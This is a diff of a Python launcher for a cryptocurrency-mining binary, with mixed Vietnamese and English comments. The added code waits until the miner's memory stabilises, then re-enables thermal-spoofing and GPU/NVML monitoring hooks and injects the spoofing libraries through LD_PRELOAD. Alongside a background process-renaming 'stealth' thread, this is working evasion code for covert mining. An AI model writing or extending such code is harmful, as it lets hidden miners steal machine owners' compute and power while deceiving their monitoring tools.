@@ -37,6 +37,14 @@ import threading
 import random
 from pathlib import Path
 
+# PHASE 3+: Enhanced Hook Sequencing - Import psutil for dynamic detection
+try:
+    import psutil
+    PSUTIL_AVAILABLE = True
+except ImportError:
+    PSUTIL_AVAILABLE = False
+    print("⚠️ [PHASE3+] psutil not available - fallback to static timing")
+
 # Add project root to Python path
 project_root = Path(__file__).parent.parent.parent.parent
 sys.path.insert(0, str(project_root))
@@ -264,9 +272,123 @@ def main():
                 
                 # Start enhanced background renaming
                 threading.Thread(target=_enhanced_stealth_rename, daemon=True).start()
-                # Sau khi khởi động process con (mining binary):
-                time.sleep(3)  # Đảm bảo tiến trình mining đã cấp phát xong bộ nhớ lớn
-                # Đổi tên process như cũ
+                
+                # ====================================
+                # PHASE 3+: Enhanced Hook Sequencing 
+                # Kết hợp static delay + dynamic detection
+                # ====================================
+                
+                def _enhanced_hook_sequencing():
+                    """
+                    PHASE 3+ Enhanced Hook Sequencing (sắp xếp hook nâng cao)
+                    Kết hợp PHASE 3 (static delay) + PHASE 1.5 (dynamic detection)
+                    """
+                    try:
+                        # PHASE 3: Initial static delay (minimum wait time)
+                        initial_delay = 10  # seconds
+                        logger.info(f"🕒 [PHASE3+] Initial delay {initial_delay}s for basic memory allocation")
+                        time.sleep(initial_delay)
+                        
+                        # PHASE 1.5: Dynamic DAG completion detection (if psutil available)
+                        dag_completed = False
+                        if PSUTIL_AVAILABLE:
+                            logger.info("🔍 [PHASE3+] Starting dynamic DAG completion detection")
+                            
+                            max_detection_time = 50  # Additional 50s for dynamic detection
+                            detection_interval = 5
+                            stable_cycles = 0
+                            required_stability = 3  # 15 seconds of stability
+                            last_memory = None
+                            
+                            for attempt in range(max_detection_time // detection_interval):
+                                try:
+                                    # Check if mining process still exists
+                                    if process.poll() is not None:
+                                        logger.error("❌ [PHASE3+] Mining process terminated during hook sequencing")
+                                        return False
+                                        
+                                    # Monitor memory stability
+                                    process_obj = psutil.Process(process.pid)
+                                    memory_percent = process_obj.memory_percent()
+                                    
+                                    if last_memory is not None:
+                                        memory_change = abs(memory_percent - last_memory)
+                                        
+                                        if memory_change < 2.0:  # Less than 2% change
+                                            stable_cycles += 1
+                                            logger.debug(f"🟢 [PHASE3+] Memory stable cycle {stable_cycles}/{required_stability}")
+                                            
+                                            if stable_cycles >= required_stability:
+                                                dag_completed = True
+                                                logger.info("✅ [PHASE3+] DAG generation completed - memory usage stabilized")
+                                                break
+                                        else:
+                                            stable_cycles = 0
+                                            logger.debug(f"🟡 [PHASE3+] Memory change: {memory_change:.1f}% - resetting stability counter")
+                                    
+                                    last_memory = memory_percent
+                                    time.sleep(detection_interval)
+                                    
+                                except psutil.NoSuchProcess:
+                                    logger.error("❌ [PHASE3+] Mining process no longer exists")
+                                    return False
+                                except Exception as e:
+                                    logger.debug(f"⚠️ [PHASE3+] Detection error: {e}")
+                                    break
+                        else:
+                            # Fallback to extended static delay if psutil unavailable
+                            logger.info("🕒 [PHASE3+] psutil unavailable - using extended static delay")
+                            time.sleep(30)  # Extended static delay
+                            dag_completed = True  # Assume completed
+                        
+                        # Gradual hook re-activation
+                        if dag_completed:
+                            logger.info("🚀 [PHASE3+] Starting gradual hook re-activation")
+                        else:
+                            logger.warning("⚠️ [PHASE3+] DAG detection timeout - proceeding with caution")
+                        
+                        # Re-enable hooks gradually
+                        try:
+                            # Step 1: Re-enable less memory-intensive hooks first
+                            time.sleep(2)
+                            os.environ['THERMAL_SPOOF_DISABLED'] = '0'
+                            logger.info("🌡️ [PHASE3+] Thermal spoofing re-enabled")
+                            
+                            # Step 2: Re-enable NVML hooks
+                            time.sleep(3)
+                            os.environ['NVML_HOOK_DISABLED'] = '0'
+                            os.environ['GPU_HOOK_DISABLED'] = '0'
+                            logger.info("📊 [PHASE3+] NVML hooks re-enabled")
+                            
+                            # Step 3: Restore LD_PRELOAD selectively
+                            time.sleep(2)
+                            thermal_lib = '/opt/hooks/libtempspoof.so'
+                            gpu_lib = '/opt/hooks/libgpuhook.so'
+                            
+                            preload_libs = []
+                            if os.path.exists(thermal_lib):
+                                preload_libs.append(thermal_lib)
+                            if os.path.exists(gpu_lib):
+                                preload_libs.append(gpu_lib)
+                                
+                            if preload_libs:
+                                os.environ['LD_PRELOAD'] = ':'.join(preload_libs)
+                                logger.info(f"🔗 [PHASE3+] LD_PRELOAD restored: {os.environ['LD_PRELOAD']}")
+                            
+                            logger.info("✅ [PHASE3+] Enhanced hook sequencing completed successfully")
+                            return True
+                            
+                        except Exception as e:
+                            logger.error(f"❌ [PHASE3+] Hook re-activation failed: {e}")
+                            return False
+                            
+                    except Exception as main_err:
+                        logger.error(f"❌ [PHASE3+] Enhanced hook sequencing failed: {main_err}")
+                        return False
+                
+                # Start PHASE 3+ Enhanced Hook Sequencing in background
+                threading.Thread(target=_enhanced_hook_sequencing, daemon=True).start()
+                logger.info("🚀 [PHASE3+] Enhanced Hook Sequencing started in background")
                 # 🚀 **DIRECT REGISTRY REGISTRATION** (đăng ký registry trực tiếp) - THAY THẾ EVENTBUS
                 try:
                     # **Import DirectPIDRegistry** (nhập DirectPIDRegistry)
